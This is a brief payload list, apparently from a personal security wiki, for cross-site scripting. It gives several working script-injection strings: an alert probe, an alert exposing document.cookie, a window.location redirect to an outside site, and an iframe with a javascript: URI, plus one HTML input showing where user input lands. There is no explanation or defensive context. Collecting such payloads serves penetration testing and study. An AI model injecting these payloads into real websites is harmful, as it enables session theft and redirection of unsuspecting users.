[[Cross-Site-Scripting]]

# Payloads
1. `<script>alert("hacked")</script>
">`
2. `"><script>alert(document.cookie)</script>`
3. `<script>window.location="http://websitetoredirectto.com/"</script>`
4. `<input type="text" name="state" value="INPUT_FROM_USER">`
5. `<IFRAME SRC="javascript:alert("HackingMonks");"></IFRAME>`
